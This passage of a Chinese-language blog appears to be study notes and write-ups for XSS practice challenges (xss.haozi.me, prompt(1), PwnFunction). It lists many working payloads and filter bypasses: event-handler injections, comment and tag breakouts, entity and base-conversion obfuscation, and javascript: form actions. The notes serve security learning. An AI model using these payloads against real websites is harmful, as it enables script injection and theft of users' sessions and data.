class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//弹窗，因为有tostring方法，把数组中第一个参数转为字符串</span></span><br><span class="line">alert<span class="string">`a`</span></span><br><span class="line"><span class="literal">undefined</span>    </span><br><span class="line"></span><br><span class="line"><span class="comment">//弹窗，因为有$&#123;&#125;执行表达式</span></span><br><span class="line"><span class="built_in">eval</span><span class="string">`<span class="subst">$&#123;alert(<span class="number">1</span>)&#125;</span>`</span></span><br><span class="line">(<span class="number">2</span>) [<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="attr">raw</span>: <span class="title class_">Array</span>(<span class="number">2</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment">//弹窗，相当于2前后加了个字符串</span></span><br><span class="line"><span class="built_in">eval</span><span class="string">`a<span class="subst">$&#123;alert(<span class="number">1</span>)&#125;</span>b`</span></span><br><span class="line">(<span class="number">2</span>) [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="attr">raw</span>: <span class="title class_">Array</span>(<span class="number">2</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment">//不弹，因为没有tostring，会放在数组中输出</span></span><br><span class="line"><span class="built_in">eval</span><span class="string">`a`</span></span><br><span class="line">[<span class="string">&#x27;a&#x27;</span>, <span class="attr">raw</span>: <span class="title class_">Array</span>(<span class="number">1</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment">//不弹，和上一条一样</span></span><br><span class="line"><span class="built_in">eval</span><span class="string">`alert(1)`</span></span><br><span class="line">[<span class="string">&#x27;alert(1)&#x27;</span>, <span class="attr">raw</span>: <span class="title class_">Array</span>(<span class="number">1</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment">//弹窗，和3一样</span></span><br><span class="line"><span class="built_in">eval</span><span class="string">`alert(1) <span class="subst">$&#123;alert(<span class="number">1</span>)&#125;</span>`</span></span><br><span class="line">(<span class="number">2</span>) [<span class="string">&#x27;alert(1) &#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="attr">raw</span>: <span class="title class_">Array</span>(<span class="number">2</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment">//弹窗，此时不是模板字符串，是函数</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="title function_">alert</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">//不弹，虽然有$&#123;&#125;执行表达式，但此时alert是字符串</span></span><br><span class="line"><span class="built_in">eval</span><span class="string">`<span class="subst">$&#123;<span class="string">&#x27;alert(1)&#x27;</span>&#125;</span>`</span></span><br><span class="line">[<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="attr">raw</span>: <span class="title class_">Array</span>(<span class="number">2</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment">//不弹，虽然可以字符串中解析16进制和Unicode，但此时解析完后仍然为字符串</span></span><br><span class="line"><span class="built_in">eval</span><span class="string">`<span class="subst">$&#123;<span class="string">&#x27;alert\x281\x29&#x27;</span>&#125;</span>`</span></span><br><span class="line">[<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="attr">raw</span>: <span class="title class_">Array</span>(<span class="number">2</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment">//上面都是先解析$&#123;&#125;，最后在解析eval</span></span><br><span class="line"><span class="comment">//对于call方法</span></span><br><span class="line"><span class="comment">//弹窗</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;alert(1)&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//弹窗，此时相当于eval(&#x27;alert(1)&#x27;),call相当于将eval内的执行</span></span><br><span class="line"><span class="built_in">eval</span>.<span class="property">call</span><span class="string">`<span class="subst">$&#123;<span class="string">&#x27;alert\x281\x29&#x27;</span>&#125;</span>`</span></span><br><span class="line"><span class="literal">undefined</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//弹窗，前面的eval相当于tag，模板字符串前可以有tag，注意返回值的不同，此时返回的不是数组 </span></span><br><span class="line"><span class="string">`aaa <span class="subst">$&#123;alert<span class="string">`1`</span>&#125;</span> bbbb`</span></span><br><span class="line"><span class="string">&#x27;aaa undefined bbbb&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//报错，不能对符号编码，因此的prompt不是字符串</span></span><br><span class="line"><span class="built_in">eval</span><span class="string">`<span class="subst">$&#123;prompt\x281\x29&#125;</span>`</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line"><span class="string">//弹窗</span></span><br><span class="line"><span class="string">eval.call`</span>$&#123;<span class="title function_">prompt</span>(<span class="number">1</span>)&#125;<span class="string">`</span></span><br><span class="line"><span class="string">undefined</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//弹窗</span></span><br><span class="line"><span class="string">eval.call`</span>aaa$&#123;<span class="title function_">prompt</span>(<span class="number">1</span>)&#125;bbb<span class="string">`</span></span><br><span class="line"><span class="string">undefined</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//不弹</span></span><br><span class="line"><span class="string">eval.call`</span><span class="title function_">alert</span>(<span class="number">1</span>)<span class="string">`</span></span><br><span class="line"><span class="string">undefined</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//弹窗</span></span><br><span class="line"><span class="string">eval.call`</span>$&#123;<span class="title function_">alert</span>(<span class="number">1</span>)&#125;<span class="string">`</span></span><br><span class="line"><span class="string">undefined</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//如果aaaa全局有定义返回变量对应的值，没有定义则not define 报错</span></span><br><span class="line"><span class="string">eval(&#x27;aaaa&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//返回[&quot;aaaaaaaaa&quot;]</span></span><br><span class="line"><span class="string">eval([&quot;aaaaaaaaa&quot;]);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//eval只能接收第一个参数的值，他只有一个参数</span></span><br><span class="line"><span class="string">eval`</span>$&#123;<span class="title function_">prompt</span>(<span class="number">1</span>)&#125;<span class="string">`</span></span><br><span class="line"><span class="string">[&#x27;&#x27;, &#x27;&#x27;, raw: Array(2)]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//`</span><span class="string">`两端字符串依然为空，但中间是一个字符串不是函数，此时第二个参数为&#x27;prompt(1)&#x27;,但eval不接</span></span><br><span class="line"><span class="string">eval`</span>$&#123;<span class="string">&#x27;prompt(1)&#x27;</span>&#125;<span class="string">`</span></span><br><span class="line"><span class="string">[&#x27;&#x27;, &#x27;&#x27;, raw: Array(2)]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//输入11111,打印11111.&#123;&#125;首先执行，返回([&quot;&quot;,&quot;&quot;],&#x27;prompt(1)&#x27;),此时数组为空，即第一个参数为空，那么call指向全局对象，全局对象window中有prompt函数，执行eval(&#x27;prompt(1)&#x27;)</span></span><br><span class="line"><span class="string">eval(&#x27;prompt(1)&#x27;)</span></span><br><span class="line"><span class="string">&#x27;11111&#x27;</span></span><br><span class="line"><span class="string">eval.call`</span>$&#123;<span class="string">&#x27;prompt(1)&#x27;</span>&#125;<span class="string">`</span></span><br><span class="line"><span class="string">&#x27;11111&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//输入aaaa,打印aaaa undefined.&#123;&#125;首先执行，返回([&quot;&quot;,&quot;&quot;],&#x27;prompt(1)&#x27;),此时数组为空，即第一个参数为空，那么call指向全局对象，全局对象没有aaaa方法，返回undefined,但注意如果输入为数字那么原样返回</span></span><br><span class="line"><span class="string">eval.call`</span>$&#123;<span class="title function_">prompt</span>(<span class="number">1</span>)&#125;<span class="string">`</span></span><br><span class="line"><span class="string">Uncaught ReferenceError: aaaa is not defined</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//eval别名调用，指向全局变量，因为js不允许指向prompt.第二个参数没传值，因此返回undefined</span></span><br><span class="line"><span class="string">eval.call`</span><span class="title function_">prompt</span>(<span class="number">1</span>)<span class="string">`</span></span><br><span class="line"><span class="string">undefined</span></span><br></pre></td></tr></table></figure>
<p>模板字符串中需要有表达式 ${} 才能执行 eval``</p>
<p>eval () 是个函数，会将传入的字符串当做代码执行，如果全局没有该字符串变量，会报错 undefined，如果传入的不是字符串，eval 会将参数直接返回</p>
<p>alert 有 tostring 方法，将数字专为字符串执行</p>
<p>eval 没有 tostring，将数字放入数组中</p>
<p>模板字符串可以解析 16 进制和 Unicode</p>
<p>call 用来改变 this 指向</p>
<h2 id="httpsxsshaozime"><a class="markdownIt-Anchor" href="#httpsxsshaozime">#</a> <span class="exturl" data-url="aHR0cHM6Ly94c3MuaGFvemkubWUv">https://xss.haozi.me/</span></h2>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDA3NzU0NC9hcnRpY2xlL2RldGFpbHMvOTUwOTQ3NTk=">https://blog.csdn.net/weixin_44077544/article/details/95094759</span></p>
<p>0x03</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:alert&amp;#40;1&amp;#41;&quot;&gt;aaa</span><br><span class="line">&lt;img src=1 onerror=&quot;alert`1`&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>0x05</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--!&gt;&lt;script&gt;alert(1)&lt;/script&gt; &lt;--!</span><br></pre></td></tr></table></figure>
<p>0x06</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">onclick</span><br><span class="line">=alert(1)</span><br><span class="line"></span><br><span class="line">type=&quot;image&quot; src=1 onerror=</span><br><span class="line">alert(1)</span><br></pre></td></tr></table></figure>
<p>0x07</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&#x27;1&#x27; onerror=&#x27;alert(1)&#x27;//</span><br></pre></td></tr></table></figure>
<p>0x08</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;/style</span><br><span class="line">&gt;</span><br><span class="line">&lt;script&gt;alert(1)</span><br></pre></td></tr></table></figure>
<p>0x09</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=https://www/segmentfault.com&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(1)//</span><br></pre></td></tr></table></figure>
<p>0x0A</p>
<p>只有 Firefox 可以进行跳转</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.segmentfault.com@xss.haozi.com/j.js</span><br></pre></td></tr></table></figure>
<p>http/https @ 会匹配后面一个并进行重定向</p>
<p>ftp @前是用户名，后是 password</p>
<p>0x0B</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt;</span><br><span class="line">&lt;img src=1 onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;(1)&quot;&gt;</span><br><span class="line">&lt;svg/onload=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt;</span><br><span class="line">&lt;svg/onload=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;(1)&quot;&gt;</span><br><span class="line">&lt;scripscriptt src=&quot;https://xss.haozi.me/j.js&quot;&gt;&lt;/scripscriptt&gt;</span><br><span class="line">&lt;cript src=&quot;https://xss.haozi.me/j.js&quot;&gt;&lt;/cript&gt;</span><br></pre></td></tr></table></figure>
<p>0x0C</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">同0x0B</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>0x0D</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">111</span><br><span class="line">alert(1)</span><br><span class="line">--&gt; </span><br></pre></td></tr></table></figure>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220912152740785.png" alt="image-20220912152740785"></p>
<p>0x0E</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ſ用在有转大写时</span><br><span class="line"></span><br><span class="line">&lt;ſcript src=&quot;https://xss.haozi.me/j.js&quot;&gt;&lt;/ſcript&gt;</span><br><span class="line">&lt;ſvg onload=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>0x0F</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;);alert(1)//</span><br></pre></td></tr></table></figure>
<p>0x10</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">执行 `中的代码,es6模板字符串</span><br><span class="line"></span><br><span class="line">alert(1)</span><br></pre></td></tr></table></figure>
<p>0x11</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;?;alert(1)/.</span><br></pre></td></tr></table></figure>
<h2 id="prompt1"><a class="markdownIt-Anchor" href="#prompt1">#</a> prompt(1)</h2>
<p>2</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">eval.call</span><br><span class="line">prompt`1`</span><br><span class="line">&lt;svg&gt;&lt;script&gt;prompt&amp;#40;1)   切换命名空间</span><br><span class="line">最好不要编码符号</span><br></pre></td></tr></table></figure>
<p>5</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aaa&quot; onerror</span><br><span class="line">=&quot;prompt(1)&quot; src=111 type=&quot;image </span><br></pre></td></tr></table></figure>
<p>6</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;form&gt;中注入</span><br><span class="line">// e.g. http://httpbin.org/post#&#123;&quot;name&quot;:&quot;Matt&quot;&#125;</span><br><span class="line">&lt;form action=&quot;http://httpbin.org/post&quot; method=&quot;post&quot;&gt;&lt;input name=&quot;name&quot; value=&quot;Matt&quot;&gt;&lt;/form&gt;</span><br><span class="line">javascript:prompt(1)#&#123;&quot;action&quot;:&quot;Matt&quot;&#125;</span><br><span class="line">&lt;form action=&quot;javascript:prompt(1)&quot; method=&quot;post&quot;&gt;&lt;input name=&quot;action&quot; value=&quot;Matt&quot;&gt;&lt;/form&gt;     </span><br><span class="line">通过input action覆盖form action</span><br><span class="line"></span><br><span class="line">&lt;script&gt;                                                  \n\</span><br><span class="line">    // forbid javascript: or vbscript: and data: stuff    \n\</span><br><span class="line">    if (!/script:|data:/i.test(document.forms[0].action)) \n\</span><br><span class="line">        document.forms[0].submit();                       \n\</span><br><span class="line">    else                                                  \n\</span><br><span class="line">        document.write(&quot;Action forbidden.&quot;)               \n\</span><br><span class="line">&lt;/script&gt;   </span><br></pre></td></tr></table></figure>
<p>7</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;/*#*/prompt/*#*/(1)/*#*/&lt;/script&gt;</span><br><span class="line">&lt;p class=&quot;comment&quot; title=&quot;&quot;&gt;&lt;script&gt;/*&quot;&gt;&lt;/p&gt;</span><br><span class="line">&lt;p class=&quot;comment&quot; title=&quot;*/prompt/*&quot;&gt;&lt;/p&gt;</span><br><span class="line">&lt;p class=&quot;comment&quot; title=&quot;*/(1)/*&quot;&gt;&lt;/p&gt;</span><br><span class="line">&lt;p class=&quot;comment&quot; title=&quot;*/&lt;/script&gt;&quot;&gt;&lt;/p&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>8</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">U+005C:反斜杠(reverse solidus)</span><br><span class="line">U+000D:回车 (carriage return)</span><br><span class="line">U+2028:行分隔符(line separator)</span><br><span class="line">U+2029∶段分隔符(paragraph separator)</span><br><span class="line">u+000A:换行符（line feed)</span><br><span class="line">&#x27;\u2028prompt(1)\u2028--&gt;&#x27;</span><br></pre></td></tr></table></figure>
<p>10</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prom&#x27;pt(1)</span><br></pre></td></tr></table></figure>
<p>11</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;(prompt(1))in&quot;</span><br></pre></td></tr></table></figure>
<p>12</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">parseInt  转为x进制数的十进制数,x范围为2-36</span><br><span class="line">36 = [a-z] + [0-9]</span><br><span class="line">如果第一个字符不能转为进制返回nan</span><br><span class="line">p = 10+16</span><br><span class="line">parseInt(&#x27;prompt&#x27;,30)</span><br><span class="line">进制数必须大于30，必须要大于t的进制数 t = 10 + 20</span><br><span class="line">parseInt(&#x27;p&#x27;,25)</span><br><span class="line">NaN</span><br><span class="line">parseInt(&#x27;p&#x27;,26)</span><br><span class="line">25</span><br><span class="line">parseInt(&#x27;p&#x27;,27)</span><br><span class="line">25</span><br><span class="line">parseInt(&#x27;p&#x27;,36)</span><br><span class="line">25</span><br><span class="line">parseInt(&#x27;prompt&#x27;,29)</span><br><span class="line">18361375</span><br><span class="line">parseInt(&#x27;prompt&#x27;,30)</span><br><span class="line">630038579</span><br><span class="line">18361375..toString(29)</span><br><span class="line">&#x27;promp&#x27;</span><br><span class="line">630038579..toString(30)</span><br><span class="line">&#x27;prompt&#x27;</span><br><span class="line">r是28进制数，如果27仍是p的结果</span><br><span class="line"></span><br><span class="line">eval(630038579..toString(30))(1)</span><br><span class="line"></span><br><span class="line">eval(&#x27;prompt&#x27;)</span><br><span class="line">ƒ prompt() &#123; [native code] &#125;</span><br><span class="line">a = eval(&#x27;prompt&#x27;)</span><br><span class="line">ƒ prompt() &#123; [native code] &#125;</span><br><span class="line">a(1)</span><br><span class="line">&#x27;&#x27;</span><br></pre></td></tr></table></figure>
<p>F</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">svg命名空间中使用xml语法，且xml注释和html注释一样</span><br><span class="line">&quot;&gt;&lt;svg&gt;....</span><br><span class="line">如果不进行命名空间切换，script无法识别html注释</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>写在最前：</p>
<p>做 pwnfunction 时时刻注意：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1.</span><br><span class="line">name = &quot;&lt;script&gt;alert(&#x27;I am John in an annoying alert!&#x27;)&lt;/script&gt;&quot;;</span><br><span class="line">el.innerHTML = name; // harmless in this case</span><br><span class="line">这种看似xss的方式是行不通的</span><br><span class="line">HTML 5 中指定不执行由 innerHTML 插入的 &lt;script&gt; 标签。</span><br><span class="line">然而，有很多不依赖 &lt;script&gt; 标签去执行 JavaScript 的方式。所以当你使用innerHTML 去设置你无法控制的字符串时，这仍然是一个安全问题。例如：</span><br><span class="line">const name = &quot;&lt;img src=&#x27;x&#x27; onerror=&#x27;alert(1)&#x27;&gt;&quot;;</span><br><span class="line">el.innerHTML = name; // shows the alert</span><br><span class="line">Copy to Clipboard</span><br><span class="line">基于这个原因，当插入纯文本时，建议不要使用 innerHTML 。取而代之的是使用 Node.textContent ，它不会把给定的内容解析为 HTML，它仅仅是将原始文本插入给定的位置。</span><br><span class="line"></span><br><span class="line">2.</span><br><span class="line"> 如果一个 &lt;div&gt;, &lt;span&gt;, 或 &lt;noembed&gt; 节点有一个文本子节点，该节点包含字符 (&amp;), (&lt;), 或 (&gt;), innerHTML 将这些字符分别返回为 &amp;amp;, &amp;lt; 和 &amp;gt;。使用Node.textContent 可获取一个这些文本节点内容的正确副本。</span><br></pre></td></tr></table></figure>
<h2 id="ma-spaghet"><a class="markdownIt-Anchor" href="#ma-spaghet">#</a> Ma Spaghet</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">somebody = &lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">尽管这看上去像cross-site scripting攻击，结果并不会导致什么。HTML 5中指定不执行由innerHTML插入的&lt;script&gt;标签。</span><br><span class="line">然而，有很多不依赖&lt;script&gt;标签去执行JavaScript的方式。所以当你使用innerHTML去设置你无法控制的字符串时，这仍然是一个安全问题。例如:&lt;img&gt;</span><br><span class="line"></span><br><span class="line">&lt;h2 id=&quot;spaghet&quot;&gt;&lt;/h2&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    spaghet.innerHTML = (new URL(location).searchParams.get(&#x27;somebody&#x27;) || &quot;Somebody&quot;) + &quot; Toucha Ma Spaghet!&quot;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;svg onload=alert(1337)&gt;</span><br></pre></td></tr></table></figure>
<h2 id="jefff"><a class="markdownIt-Anchor" href="#jefff">#</a> Jefff</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvemgtQ04vZG9jcy9XZWIvSmF2YVNjcmlwdC9SZWZlcmVuY2UvR2xvYmFsX09iamVjdHMvZXZhbA==">eval() - JavaScript | MDN (mozilla.org)</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9zb3VyY2VncmFwaC5jb20vZ2l0aHViLmNvbS93YW5nZG9jL2phdmFzY3JpcHQtdHV0b3JpYWwvLS9ibG9iL2RvY3MvdHlwZXMvZnVuY3Rpb24ubWQ=">function.md - wangdoc/javascript-tutorial - Sourcegraph</span></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2 id=&quot;maname&quot;&gt;&lt;/h2&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    let jeff = (new URL(location).searchParams.get(&#x27;jeff&#x27;) || &quot;JEFFF&quot;)</span><br><span class="line">    let ma = &quot;&quot;</span><br><span class="line">    eval(`ma = &quot;Ma name $&#123;jeff&#125;&quot;`)</span><br><span class="line">    setTimeout(_ =&gt; &#123;</span><br><span class="line">        maname.innerText = ma</span><br><span class="line">    &#125;, 1000)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">eval([&quot;&quot;,&quot;&quot;],prompt(1))</span><br><span class="line">(2) [&#x27;&#x27;, &#x27;&#x27;]</span><br><span class="line">eval([&quot;&quot;,&quot;&quot;],&#x27;aaaaa&#x27;)</span><br><span class="line">(2) [&#x27;&#x27;, &#x27;&#x27;]</span><br><span class="line">//eval没有tostring方法，会返回数组形式的第一个参数</span><br><span class="line">如果eval的参数不是字符串，那么会原样返回。</span><br><span class="line"></span><br><span class="line">1&quot;;alert(1)//</span><br><span class="line">1&quot;,alert(1)//</span><br><span class="line">jeff=&quot;-alert(1)-&quot;</span><br><span class="line">在js中-两边都是表达式，则可以执行代码</span><br><span class="line">先闭合Ma name 1&quot; 再用,或者;分割作为eval第二个参数，实现上面那个例子的弹窗</span><br></pre></td></tr></table></figure>
<h2 id="da-wey"><a class="markdownIt-Anchor" href="#da-wey">#</a> da-wey</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;uganda&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    let wey = (new URL(location).searchParams.get(&#x27;wey&#x27;) || &quot;do you know da wey?&quot;);</span><br><span class="line">    wey = wey.replace(/[&lt;&gt;]/g, &#x27;&#x27;)</span><br><span class="line">    uganda.innerHTML = `&lt;input type=&quot;text&quot; placeholder=&quot;$&#123;wey&#125;&quot; class=&quot;form-control&quot;&gt;`</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">?wey=1&quot; onfocus=alert(1) autofocus//</span><br></pre></td></tr></table></figure>
<h2 id="ricardo"><a class="markdownIt-Anchor" href="#ricardo">#</a> ricardo</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;form id=&quot;ricardo&quot; method=&quot;GET&quot;&gt;</span><br><span class="line">    &lt;input name=&quot;milos&quot; type=&quot;text&quot; class=&quot;form-control&quot; placeholder=&quot;True&quot; value=&quot;True&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    ricardo.action = (new URL(location).searchParams.get(&#x27;ricardo&#x27;) || &#x27;#&#x27;)</span><br><span class="line">    setTimeout(_ =&gt; &#123;</span><br><span class="line">        ricardo.submit()</span><br><span class="line">    &#125;, 2000)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">ricardo=javascript:alert(1)</span><br><span class="line"></span><br><span class="line">效果类似于这样:</span><br><span class="line"></span><br><span 